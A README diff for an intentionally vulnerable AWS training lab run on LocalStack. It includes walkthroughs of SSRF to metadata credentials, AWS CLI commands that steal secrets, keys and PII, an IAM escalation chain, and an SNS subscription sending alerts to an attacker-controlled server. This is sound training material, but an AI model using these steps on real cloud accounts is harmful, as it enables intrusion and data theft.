@@ -1,202 +1,581 @@
-# NSCS-Gate: Cloud Security Cyber Range
+# 🛡️ NSCS-Gate: Cloud Security Cyber Range
 
-Welcome to **NSCS-Gate**, an intentionally vulnerable cloud environment designed for security training, penetration testing, and learning about cloud misconfigurations. 
-
-Instead of focusing on traditional web application vulnerabilities (like cross-site scripting or SQL injection), this project is entirely dedicated to **Cloud Infrastructure Security**, specifically focusing on AWS (Amazon Web Services). 
-
-It simulates a real-world corporate portal built on top of cloud services, but with catastrophic architectural flaws that allow you to steal credentials, download sensitive corporate data, and hijack cloud resources.
+> An intentionally vulnerable cloud environment for hands-on red team / blue team security training, built around AWS service misconfigurations and common developer mistakes.
 
 ---
 
-## 🏗️ How It Works (The Architecture)
+## 📋 Table of Contents
 
-This project runs a complete "fake" AWS cloud right on your local computer so you can hack it safely. 
-It uses three main technologies:
-
-1. **LocalStack (The Cloud Engine):** A tool that acts exactly like Amazon Web Services (AWS), but runs offline on your machine.
-2. **Terraform (The Builder):** A tool that reads our configuration files and automatically builds the cloud infrastructure inside LocalStack (creating databases, storage buckets, and serverless functions).
-3. **Docker (The Container):** Packages all of these tools and the vulnerable "NSCS-Gate" web application so they run seamlessly together on any computer.
-
-### The Cloud Services Used
-When you start the environment, it creates:
-* **S3 (Simple Storage Service):** Cloud hard-drives used for storing files.
-* **DynamoDB:** A NoSQL database storing user accounts.
-* **Lambda:** "Serverless" backend code that runs on demand.
-* **SQS & SNS:** Message queues and notification systems.
-* **IAM (Identity and Access Management):** The permission system controlling who can do what.
-* **Secrets Manager & SSM:** Secure vaults for storing passwords and configurations.
-* **Metadata Service (IMDS):** A simulated internal server that provides temporary credentials to applications.
+1. [Overview](#-overview)
+2. [Architecture](#-architecture)
+3. [Prerequisites](#-prerequisites)
+4. [Installation & Setup](#-installation--setup)
+   - [PC1 — Cloud Target (Host Machine)](#pc1--cloud-target-host-machine)
+   - [PC2 — Security Monitor (SIEM)](#pc2--security-monitor-siem)
+   - [PC3 — Attacker Machine](#pc3--attacker-machine)
+5. [Services & Ports](#-services--ports)
+6. [Toggling Vulnerability Mode](#-toggling-vulnerability-mode)
+7. [Exploitation Challenges](#-exploitation-challenges)
+8. [Monitoring & Detection](#-monitoring--detection)
+9. [Cleanup & Reset](#-cleanup--reset)
+10. [Vulnerability Reference](#-vulnerability-reference)
+11. [Disclaimer](#-disclaimer)
 
 ---
 
-## 🚀 Getting Started (Installation & Setup)
+## 🌐 Overview
 
-You do not need an AWS account. Everything runs locally safely.
+**NSCS-Gate** simulates a real-world corporate cloud portal running on AWS services — with catastrophic architectural flaws baked in. Rather than focusing on traditional web vulnerabilities (XSS, SQLi), this lab is dedicated entirely to **Cloud Infrastructure Security**: IAM misconfigurations, SSRF to credential theft, public S3 buckets, Lambda information disclosure, and more.
 
-### Prerequisites
-You need these three free tools installed on your computer:
-1. [Docker Desktop](https://www.docker.com/products/docker-desktop/) (Must be running)
-2. [Terraform](https://developer.hashicorp.com/terraform/install)
-3. [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
+The lab supports two operational modes, instantly switchable:
 
-### Step 1: Start the Docker Infrastructure
-Open your terminal (PowerShell or Command Prompt), navigate to the folder containing this project, and run:
+| Mode | Command | Description |
+|------|---------|-------------|
+| 🔴 **Vulnerable** (default) | `bash scripts/vulner.sh` | All intentional flaws active — red team mode |
+| 🔒 **Hardened** | `bash scripts/fix.sh` | All vulnerabilities patched — blue team / remediation training |
+
+---
+
+## 🏗️ Architecture
+
+The lab is designed as a **3-PC scenario** to simulate a realistic enterprise environment:
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                         LAN / VPN Network                        │
+│                                                                  │
+│  ┌──────────────────┐    logs     ┌──────────────────────────┐  │
+│  │   PC1 — TARGET   │ ──────────▶ │   PC2 — SOC / MONITOR    │  │
+│  │                  │             │                          │  │
+│  │  LocalStack:4566 │             │  Wazuh Manager (SIEM)    │  │
+│  │  VulnApp:8080    │             │  Wazuh Dashboard:443     │  │
+│  │  Prometheus:9090 │             │  (receives agent events) │  │
+│  │  Grafana:3000    │             └──────────────────────────┘  │
+│  │  Wazuh Agent     │                                           │
+│  └──────────────────┘                                           │
+│          ▲                                                       │
+│          │  attacks                                              │
+│  ┌──────────────────┐                                           │
+│  │  PC3 — ATTACKER  │                                           │
+│  │                  │                                           │
+│  │  Browser         │                                           │
+│  │  AWS CLI         │                                           │
+│  └──────────────────┘                                           │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### Internal Docker Network (`cyberrange` bridge)
+
+```
+localstack-main (:4566)       ← Fake AWS (S3, IAM, Lambda, DynamoDB, etc.)
+vulnerable-app  (:8080)       ← NSCS-Gate Flask web portal
+metadata-service (:80)        ← Fake EC2 IMDS (credential theft target)
+prometheus       (:9090)      ← Metrics collection
+grafana          (:3000)      ← Dashboards
+node-exporter    (:9100)      ← Host resource metrics
+```
+
+---
+
+## 🔧 Prerequisites
+
+### PC1 — Cloud Target (Windows or Linux)
+
+| Tool | Version | Purpose |
+|------|---------|---------|
+| [Docker Desktop](https://www.docker.com/products/docker-desktop/) | ≥ 24.x | Runs all containers |
+| [Docker Compose](https://docs.docker.com/compose/) | ≥ 2.x (bundled with Desktop) | Orchestrates the stack |
+| [Terraform](https://developer.hashicorp.com/terraform/install) | ≥ 1.5 | Provisions AWS resources into LocalStack |
+| [AWS CLI](https://aws.amazon.com/cli/) | ≥ 2.x | Interact with LocalStack from the host |
+
+### PC2 — Monitor (Linux recommended)
+
+| Tool | Version | Purpose |
+|------|---------|---------|
+| Docker & Docker Compose | ≥ 24.x | Runs Wazuh SIEM stack |
+| Git | any | Clones the Wazuh Docker repo |
+
+### PC3 — Attacker
+
+| Tool | Purpose |
+|------|---------|
+| Web browser | Accesses NSCS-Gate web portal |
+| AWS CLI ≥ 2.x | Executes cloud API calls using stolen credentials |
+| `curl` / `httpie` | Optional — for raw HTTP exploit testing |
+
+---
+
+## 📦 Installation & Setup
+
+> **Order matters:** Set up PC2 first so Wazuh is ready to receive log events before the agent on PC1 is installed.
+
+---
+
+### PC1 — Cloud Target (Host Machine)
+
+#### Step 1 — Clone the Repository
+
 ```bash
+git clone https://github.com/your-org/CyberRange.git
+cd CyberRange
+```
+
+#### Step 2 — Configure AWS CLI for LocalStack
+
+LocalStack accepts any dummy credentials. Configure the AWS CLI profile so commands work locally:
+
+```bash
+aws configure set aws_access_key_id     test
+aws configure set aws_secret_access_key test
+aws configure set region                us-east-1
+aws configure set output                json
+```
+
+> 💡 All AWS CLI commands targeting LocalStack require `--endpoint-url http://localhost:4566`. You can create an alias:
+> ```bash
+> alias awslocal='aws --endpoint-url=http://localhost:4566'
+> ```
+
+#### Step 3 — Start the Docker Stack
+
+```bash
+# Builds the custom images (vulnerable-app, metadata-service) and starts all containers
 docker compose up -d --build
 ```
-*Wait about 30 seconds for all the services to start up.*
 
-### Step 2: Build the Cloud Environment
-Now, use Terraform to deploy the databases, buckets, and roles into the LocalStack cloud:
+Verify all containers are healthy:
+
+```bash
+docker compose ps
+```
+
+Expected output:
+
+```
+NAME               IMAGE                    STATUS
+localstack-main    localstack/localstack    running (healthy)
+vulnerable-app     cyberrange-vulnerable-app running
+metadata-service   cyberrange-metadata-service running
+prometheus         prom/prometheus           running
+grafana            grafana/grafana           running
+node-exporter      prom/node-exporter        running
+```
+
+> ⏳ **Wait 15–30 seconds** for LocalStack to fully initialize before running Terraform.
+
+#### Step 4 — Deploy Cloud Infrastructure with Terraform
+
 ```bash
 terraform init
 terraform apply -auto-approve
 ```
 
-### Step 3: Access the Application
-Open your web browser and go to:
-**http://localhost:8080**
+This provisions ~40 AWS resources into LocalStack:
+- S3 buckets (with seeded sensitive files)
+- DynamoDB `users` table (with 5 seeded accounts)
+- IAM users, roles, and policies (intentionally overprivileged)
+- Lambda function (`vulnerable-api`)
+- API Gateway (unauthenticated)
+- SQS queues, SNS topics, Secrets Manager secrets, SSM parameters, KMS key
 
-You are now looking at the **NSCS-Gate** portal. Feel free to click around, create an account, upload files, and explore.
+Successful apply output:
+
+```
+Apply complete! Resources: 40 added, 0 changed, 0 destroyed.
+
+Outputs:
+  api_endpoint       = "http://localhost:4566/restapis/.../prod/_user_request_/data"
+  public_bucket      = "sensitive-data-bucket"
+  vulnerable_app_url = "http://localhost:8080"
+  ...
+```
+
+#### Step 5 — Install the Wazuh Agent (Security Monitoring)
+
+Once PC2's Wazuh Manager is running, install the agent on PC1 to ship logs:
+
+```bash
+# Replace <PC2_IP> with the actual IP address of your monitoring machine
+sudo bash scripts/wazuh_agent.sh <PC2_IP>
+```
+
+The script will:
+1. Add the Wazuh APT repository (GPG-verified)
+2. Install `wazuh-agent` pointed at your manager
+3. Configure log monitoring for the `vulnerable-app` and `localstack` containers
+4. Start and enable the agent systemd service
+
+Verify the agent is running:
+
+```bash
+sudo systemctl status wazuh-agent
+```
+
+The agent should appear in the Wazuh Dashboard (`https://<PC2_IP>`) within a few minutes.
 
 ---
 
-## 🎯 The Vulnerabilities (Exploitation & Remediation Guide)
+### PC2 — Security Monitor (SIEM)
 
-This environment contains several critical cloud misconfigurations. Below is a guide explaining each flaw in simple terms, how a hacker would exploit it, and how a security engineer would fix it.
+> Run this **before** setting up PC1's agent.
 
-### 1. The SSRF Attack (Stealing Cloud Credentials)
+#### Step 1 — Run the Manager Deployment Script
 
-**What is it?** 
-Server-Side Request Forgery (SSRF) happens when an application is tricked into talking to an internal server that the outside internet shouldn't be able to reach. In the cloud, the most dangerous internal server is the **Instance Metadata Service (IMDS)**, which lives at the IP address `169.254.169.254` (or in our simulated case, `metadata-service`). This service hands out powerful, temporary access keys to the application.
+```bash
+sudo bash scripts/wazuh_manager.sh
+```
 
-**How to Exploit it:**
-1. Log into the NSCS-Gate portal at `http://localhost:8080`.
-2. Go to the **Webhooks** tab. This feature is designed to test external URLs (like `http://google.com`).
-3. Instead of a normal website, ask the application to fetch the secret internal metadata endpoint by entering this URL:
-   `http://metadata-service/latest/meta-data/iam/security-credentials/vulnerable-role`
-4. Click "Test Connection".
-5. The application will blindly reach out to the internal server, retrieve the raw AWS IAM Access Key, Secret Key, and Session Token, and display them on your screen. You have now stolen the server's identity.
+The script will:
+1. Install Docker if not present (skips if already installed)
+2. Clone the official Wazuh Docker repository (tag `v4.7.0`)
+3. Generate TLS certificates for the Wazuh Indexer
+4. Launch the full 3-container Wazuh stack via Docker Compose:
+   - **Wazuh Manager** — processes and correlates events
+   - **Wazuh Indexer** (OpenSearch) — stores all logs
+   - **Wazuh Dashboard** — web UI at `https://<PC2_IP>`
 
-**How to Fix it:**
-* **Network Level:** Upgrade the cloud environment to require IMDSv2 (Version 2). IMDSv2 requires special encrypted headers that SSRF attacks cannot easily generate, blocking the attack completely.
-* **Application Level:** Add strict validation to the Webhooks feature. Never allow the application to make outbound requests to internal IP addresses or domains.
+> ⏳ **Wait 5–10 minutes** for the stack to fully initialize on first run.
+
+#### Step 2 — Access the Dashboard
+
+```
+URL:      https://<PC2_IP>
+Username: admin
+Password: SecretPassword
+```
+
+> ⚠️ Accept the self-signed TLS certificate warning in your browser.
 
 ---
 
-### 2. Overprivileged Identity (Too Much Power)
+### PC3 — Attacker Machine
 
-**What is it?**
-When the application runs, it uses an IAM Role (its identity card) to talk to the database and storage. The Principle of Least Privilege says an app should only have exactly the permissions it needs. Our app, however, has wildcard (`*`) permissions, meaning it is treated like an overall administrator.
+No server setup required. Just ensure the following are installed:
 
-**How to Exploit it:**
-1. Using the Access Key and Secret Key you stole in Vulnerability #1, open your computer's terminal.
-2. Configure your local AWS CLI to use the stolen keys:
-   ```bash
-   export AWS_ACCESS_KEY_ID="<STOLEN_ACCESS_KEY>"
-   export AWS_SECRET_ACCESS_KEY="<STOLEN_SECRET_KEY>"
-   export AWS_SESSION_TOKEN="<STOLEN_TOKEN>"
+```bash
+# Verify AWS CLI
+aws --version
+
+# Configure dummy creds pointing at PC1
+aws configure set aws_access_key_id     attacker
+aws configure set aws_secret_access_key attacker
+aws configure set region                us-east-1
+```
+
+Access the target web portal:
+
+```
+http://<PC1_IP>:8080
+```
+
+---
+
+## 🌐 Services & Ports
+
+| Service | URL | Credentials | Notes |
+|---------|-----|-------------|-------|
+| **NSCS-Gate** (web portal) | `http://localhost:8080` | Register any account | Main attack surface |
+| **LocalStack** (fake AWS) | `http://localhost:4566` | `test` / `test` | AWS API endpoint |
+| **Grafana** | `http://localhost:3000` | `admin` / `admin` | Metrics dashboards |
+| **Prometheus** | `http://localhost:9090` | None | Raw metrics |
+| **Wazuh Dashboard** | `https://<PC2_IP>` | `admin` / `SecretPassword` | SIEM alerts |
+
+### Pre-seeded DynamoDB Accounts (login to NSCS-Gate)
+
+| Username | Password | Role |
+|----------|----------|------|
+| `admin` | `P@ssw0rd123!` | Administrator |
+| `jsmith` | `Welcome1!` | Developer |
+| `mjones` | `Summer2026!` | Analyst |
+| `dbrown` | `Qwerty789` | Intern |
+
+---
+
+## 🔄 Toggling Vulnerability Mode
+
+The two toggle scripts let you instantly switch the lab between fully vulnerable (red team) and fully hardened (blue team) states.
+
+### Switch to Hardened Mode (Blue Team)
+
+```bash
+sudo bash scripts/fix.sh
+```
+
+Patches applied:
+- 🔑 Cryptographically random session secret
+- 🚫 SSRF blocklist (blocks `169.254.169.254`, internal IPs, container hostnames)
+- 🙈 `/api/status` no longer exposes internal service topology
+- 🔒 IDOR ownership check on file sharing
+- 🔐 SHA-256 password hashing (register + login)
+- 📦 Lambda: credentials from env vars, debug mode off, sanitized error responses
+- ☁️ Cloud: S3 public policy → Deny, IAM wildcard → least-privilege, SQS/SNS restricted
+
+> Automatically rebuilds the Docker container and updates seeded DynamoDB passwords.
+> Run `terraform apply` to apply the cloud infra changes.
+
+### Restore Vulnerabilities (Red Team)
+
+```bash
+sudo bash scripts/vulner.sh
+```
+
+Reverts every patch above to the original vulnerable state.
+
+> ⚠️ Only run in an **isolated lab network**. Never on production systems.
+
+---
+
+## 🎯 Exploitation Challenges
+
+### Challenge 1 — SSRF: Steal Cloud Credentials
+
+**Difficulty:** 🟢 Easy
+
+The `/webhooks/test` endpoint fetches any URL the user supplies — including internal services.
+
+1. Register and log into NSCS-Gate at `http://<PC1_IP>:8080`
+2. Navigate to **Webhooks**
+3. Enter the IMDS credential URL:
    ```
-3. Because the role has too much power, you can ask the cloud to list every storage bucket it has:
-   ```bash
-   aws --endpoint-url=http://localhost:4566 s3 ls
+   http://metadata-service/latest/meta-data/iam/security-credentials/vulnerable-role
    ```
-4. You can also explore the Secrets vault:
-   ```bash
-   aws --endpoint-url=http://localhost:4566 secretsmanager list-secrets
-   ```
-
-**How to Fix it:**
-* **IAM Policy Enforcement:** Rewrite the Terraform code (`main.tf`). Look for the `aws_iam_policy` attached to the `vulnerable-role`. Change `Action = "*"` to specific, limited actions like `s3:PutObject` and restrict `Resource = "*"` to only the exact bucket the app needs.
+4. Click **Test Connection** — the temporary AWS credentials appear in the response
 
 ---
 
-### 3. S3 Bucket Misconfiguration (Public Data Exposure)
+### Challenge 2 — Overprivileged IAM: Full Cloud Takeover
 
-**What is it?**
-Amazon S3 buckets are meant to store files securely. However, misconfigured S3 buckets are the #1 cause of major corporate data leaks. In our project, the `sensitive-data-bucket` has been given a reckless policy that allows anyone with *any* AWS account to read it. Furthermore, the administrators have placed highly sensitive backup files in it.
+**Difficulty:** 🟡 Medium
 
-**How to Exploit it:**
-1. Let's assume you found the name of the bucket (`sensitive-data-bucket`) via the overprivileged role above.
-2. Use the AWS CLI to list everything inside the bucket:
-   ```bash
-   aws --endpoint-url=http://localhost:4566 s3 ls s3://sensitive-data-bucket/ --recursive
-   ```
-3. You will see sensitive files that were entirely hidden from the web portal, such as `configs/.env`, `backups/db-backup-2023.sql`, and `ssh/id_rsa`.
-4. Download the `.env` file to your computer to steal the production passwords:
-   ```bash
-   aws --endpoint-url=http://localhost:4566 s3 cp s3://sensitive-data-bucket/configs/.env .
-   cat .env
-   ```
+Use the stolen credentials from Challenge 1 to take control of the cloud environment.
 
-**How to Fix it:**
-* **Bucket Policies:** Remove the `aws_s3_bucket_policy` in Terraform that grants `Principal: "*"` access.
-* **Block Public Access:** Enforce "Block Public Access" at the account level on AWS so no bucket can ever accidentally be made public.
+```bash
+export AWS_ACCESS_KEY_ID="<STOLEN_KEY>"
+export AWS_SECRET_ACCESS_KEY="<STOLEN_SECRET>"
+export AWS_SESSION_TOKEN="<STOLEN_TOKEN>"
 
----
+# Enumerate all S3 buckets
+aws --endpoint-url=http://<PC1_IP>:4566 s3 ls
 
-### 4. Direct Exposure of Cloud Vaults (Secrets Manager & SSM)
+# List all IAM users
+aws --endpoint-url=http://<PC1_IP>:4566 iam list-users
 
-**What is it?**
-AWS provides secure vaults (Secrets Manager and Systems Manager Parameter Store) to safely hold things like database passwords, so developers don't have to write them directly into the code. However, NSCS-Gate makes a critical mistake: it pulls the secrets from the vault, and then prints them directly to the user interface.
-
-**How to Exploit it:**
-1. Log into the NSCS-Gate portal.
-2. Look at the **Dashboard** tab.
-3. The page dynamically pulls the `CLOUD_CONFIG` variable from AWS Secrets Manager and prints `prod/database/credentials` right on the screen. The secure vault is doing its job, but the web application is carelessly leaking the vault's contents to regular users.
-
-**How to Fix it:**
-* **Code Review:** Modify `app.py`. The application should pull secrets into its background computer memory to use them (e.g., to connect to the database), but those secret variables should *never* be passed into the frontend HTML templates.
+# List all DynamoDB tables
+aws --endpoint-url=http://<PC1_IP>:4566 dynamodb list-tables
+```
 
 ---
 
-### 5. Inefficient & Insecure Database Authentication (DynamoDB Scan)
+### Challenge 3 — S3 Misconfiguration: Public Data Exposure
 
-**What is it?**
-DynamoDB is a massive, fast NoSQL database. The proper way to find a user is to perform a direct "Query" using an index (like searching their exact username). Instead, the NSCS-Gate login code performs a "Scan". A scan pulls *every single row* of the entire database into memory, reads them one by one, and checks if the username matches. 
+**Difficulty:** 🟢 Easy
 
-**How to Exploit it:**
-* **Data Exposure:** If an attacker finds a flaw in the python loop checking the scan, or if the system logs the output of the scan, the *entire* database of users and passwords is exposed.
-* **Denial of Service (DoS):** Because a scan is so heavy, an attacker could write a script to rapidly attempt to log in 1,000 times a second. The database would exhaust all its compute resources pulling the whole table entirely into memory repeatedly, crashing the application and resulting in massive AWS cloud billing charges.
+The `sensitive-data-bucket` is publicly readable without authentication.
 
-**How to Fix it:**
-* **Refactoring:** Rewrite the `/login` route in `app.py`. Replace `dynamodb.scan()` with a specific `dynamodb.get_item()` or `dynamodb.query()` that only asks the cloud for the single row matching the exact `username` provided.
+```bash
+# List all files (no credentials required)
+aws --endpoint-url=http://<PC1_IP>:4566 s3 ls s3://sensitive-data-bucket/ --recursive
 
----
+# Download the production .env file
+aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/.env .
 
-### 6. Serverless API Information Disclosure (Lambda)
+# Download the SSH deploy key
+aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/keys/deploy_key.pem .
 
-**What is it?**
-Serverless functions (AWS Lambda) spin up on demand to run small chunks of code. If poorly written, when they crash or encounter bad data, they can spit out their internal programming errors back to the user interface, revealing secret environment variables.
-
-**How to Exploit it:**
-1. Log into the NSCS-Gate portal.
-2. Go to the **Serverless APIs** tab.
-3. Select "Get User Details" and leave the "User ID" box completely blank. Click Invoke.
-4. The Lambda function expects an ID. Because it receives nothing, the Python code inside the cloud function crashes.
-5. Instead of gracefully returning a generic "Error", the Lambda function catches the exception and returns the *full stack trace* alongside its environment variables to help the "developer" debug.
-6. Look closely at the error output. Because Lambda injects its own environment configurations silently, you will see highly sensitive internal AWS Keys and the hardcoded `DB_PASSWORD` printed right in the crash log.
-
-**How to Fix it:**
-* **Graceful Error Handling:** Developers must ensure that system exceptions (`try/except` blocks) log errors securely to an internal logging tool (like CloudWatch), and return a sanitized, polite message to the user: `{"error": "An expected error occurred."}`.
-* **Secrets Management:** Never hardcode passwords (`DB_PASSWORD`) directly into Lambda environment variables. Have the Lambda function securely fetch them from Secrets Manager at runtime.
+# Download the leaked PII data
+aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/exports/customer_pii.csv .
+```
 
 ---
 
-## 🧹 Cleanup and Teardown
+### Challenge 4 — Cloud Vault Exposure (SSM / Dashboard)
 
-When you are done experimenting and want to wipe everything clean, you can destroy the cloud resources and stop the Docker containers.
+**Difficulty:** 🟢 Easy
 
-We have provided scripts that safely automate this process.
+The application prints secrets retrieved from AWS SSM Parameter Store directly onto the Dashboard page.
 
-**If you are on Windows (PowerShell):**
+1. Log into NSCS-Gate
+2. Navigate to **Dashboard**
+3. Observe `DB_PASSWORD`, `stripe_key`, `jwt_secret` and other secrets in the config dump
+
+Via AWS CLI (using stolen creds):
+```bash
+# List all SSM parameters
+aws --endpoint-url=http://<PC1_IP>:4566 ssm describe-parameters
+
+# Read the database connection string
+aws --endpoint-url=http://<PC1_IP>:4566 ssm get-parameter \
+    --name /prod/database/connection-string --with-decryption
+
+# Dump all Secrets Manager secrets
+aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager list-secrets
+aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager get-secret-value \
+    --secret-id prod/api/keys
+```
+
+---
+
+### Challenge 5 — Serverless Info Disclosure (Lambda)
+
+**Difficulty:** 🟢 Easy
+
+The `vulnerable-api` Lambda function leaks its environment variables and hardcoded DB credentials when it crashes.
+
+1. Navigate to **Serverless APIs**
+2. Select **Get User Details**
+3. Leave the **User ID** field empty and click **Invoke Lambda Function**
+4. Observe the `DB_PASSWORD`, hardcoded `aws_key`, and full `environment` dict in the error response
+
+---
+
+### Challenge 6 — IAM Privilege Escalation Chain
+
+**Difficulty:** 🔴 Hard
+
+Follow the breadcrumbs to escalate from a low-privilege `intern-user` to full admin.
+
+```bash
+# Step 1: Start as the intern (get key from terraform output or /api/status)
+export AWS_ACCESS_KEY_ID="<intern_access_key>"
+export AWS_SECRET_ACCESS_KEY="test"
+
+# Step 2: Discover breadcrumbs in S3
+aws --endpoint-url=http://<PC1_IP>:4566 s3 cp \
+    s3://sensitive-data-bucket/docs/internal_memo.md -
+
+# Step 3: Use intern's secretsmanager access to steal dev-user keys
+aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager get-secret-value \
+    --secret-id prod/iam/dev-user-keys
+
+# Step 4: Switch to dev-user and assume the vulnerable-role
+export AWS_ACCESS_KEY_ID="<dev_access_key>"
+aws --endpoint-url=http://<PC1_IP>:4566 sts assume-role \
+    --role-arn arn:aws:iam::000000000000:role/vulnerable-role \
+    --role-session-name pwned
+
+# Step 5: Use the assumed role credentials — full Admin access
+```
+
+---
+
+### Challenge 7 — Open SQS/SNS (Message Injection)
+
+**Difficulty:** 🟡 Medium
+
+The SQS queue and SNS topic accept messages from any principal.
+
+```bash
+# Inject a fake job into the order processing queue
+aws --endpoint-url=http://<PC1_IP>:4566 sqs send-message \
+    --queue-url http://localhost:4566/000000000000/order-processing-queue \
+    --message-body '{"task":"DELETE all orders","submitted_by":"attacker"}'
+
+# Subscribe an external URL to the internal security-alerts SNS topic
+aws --endpoint-url=http://<PC1_IP>:4566 sns subscribe \
+    --topic-arn arn:aws:sns:us-east-1:000000000000:security-alerts \
+    --protocol http \
+    --notification-endpoint http://<ATTACKER_SERVER>/snitch
+```
+
+---
+
+## 📊 Monitoring & Detection
+
+### Grafana Dashboards (`http://localhost:3000`)
+
+Pre-configured to show:
+- LocalStack container CPU / memory
+- HTTP request rates to the vulnerable app
+- Host system resources (via Node Exporter)
+
+Login: `admin` / `admin`
+
+### Wazuh SIEM (`https://<PC2_IP>`)
+
+The Wazuh agent on PC1 ships logs from:
+- `vulnerable-app` Docker container (JSON format)
+- `localstack-main` Docker container (JSON format)
+- `metadata-service` Docker container (JSON format)
+- LocalStack volume logs (`./volume/logs/*.log`)
+
+Key alerts to watch for during red team exercises:
+- Requests to `169.254.169.254` (IMDS credential theft)
+- `s3:ListBucket` without credentials (public bucket enumeration)
+- `secretsmanager:GetSecretValue` calls
+- `sts:AssumeRole` lateral movement attempts
+- Unexpected Lambda invocations with malformed payloads
+
+---
+
+## 🧹 Cleanup & Reset
+
+### Quick Reset (Windows — PowerShell)
+
+Tears down everything and re-deploys from scratch:
+
 ```powershell
 .\scripts\reset.ps1
 ```
 
-**If you are on Mac/Linux (Bash):**
+### Quick Reset (Linux / macOS)
+
 ```bash
-./scripts/reset.sh
+bash scripts/reset.sh
 ```
 
-This will run `terraform destroy` to delete the simulated cloud infrastructure and `docker compose down -v` to stop the environment entirely.
+What the reset script does:
+1. `terraform destroy` — destroys all LocalStack resources
+2. `docker compose down -v` — stops containers and removes volumes
+3. Deletes `.terraform/`, `terraform.tfstate`, `lambda/handler.zip`
+4. `docker compose up -d --build` — rebuilds and restarts everything
+5. `terraform init && terraform apply` — re-provisions all cloud resources
+
+### Manual Teardown
+
+```bash
+# Stop all containers
+docker compose down -v
+
+# Remove Terraform state
+rm -rf .terraform terraform.tfstate terraform.tfstate.backup
+
+# Remove compiled Lambda artifact
+rm -f lambda/handler.zip
+```
+
+---
+
+## 📚 Vulnerability Reference
+
+| ID | Name | File | Severity | Challenge |
+|----|------|------|----------|-----------|
+| V1 | SSRF — IMDS Credential Theft | `app.py` `/webhooks/test` | 🔴 Critical | 1 |
+| V2 | Overprivileged IAM Role (wildcard `*`) | `main.tf` | 🔴 Critical | 2 |
+| V3 | Public S3 Bucket (PII, keys, DB dumps) | `main.tf` | 🔴 Critical | 3 |
+| V4 | Sensitive config in SSM dumped to UI | `app.py` `/dashboard` | 🟠 High | 4 |
+| V5 | Lambda hardcoded creds + debug error response | `lambda/handler.py` | 🟠 High | 5 |
+| V6 | IAM privilege escalation chain | `main.tf` | 🔴 Critical | 6 |
+| V7 | Open SQS/SNS — public message injection | `main.tf` | 🟡 Medium | 7 |
+| V8 | IDOR — `/drive/share` fetches any S3 key | `app.py` | 🟠 High | — |
+| V9 | Plaintext password storage in DynamoDB | `app.py` | 🟠 High | — |
+| V10 | Weak static Flask session secret | `app.py` | 🟡 Medium | — |
+| V11 | Info disclosure — `/api/status` leaks topology | `app.py` | 🟡 Medium | — |
+| V12 | Cross-account confused deputy IAM role | `main.tf` | 🟠 High | — |
+| V13 | Unauthenticated API Gateway → Lambda | `main.tf` | 🟠 High | — |
+| V14 | KMS key with wildcard `Principal: *` policy | `main.tf` | 🟡 Medium | — |
+
+---
+
+## ⚠️ Disclaimer
+
+This environment is **intentionally insecure**. It contains hardcoded credentials, public cloud resources, and deliberately exploitable code.
+
+- ✅ **DO** run this in an isolated local lab or private network
+- ✅ **DO** use it for authorized security training and education
+- ❌ **DO NOT** expose any port to the public internet
+- ❌ **DO NOT** deploy these patterns to real AWS accounts
+- ❌ **DO NOT** use this on any machine you do not own
+
+---
+
+*Built for the NSCS CyberRange training program. 🛡️*
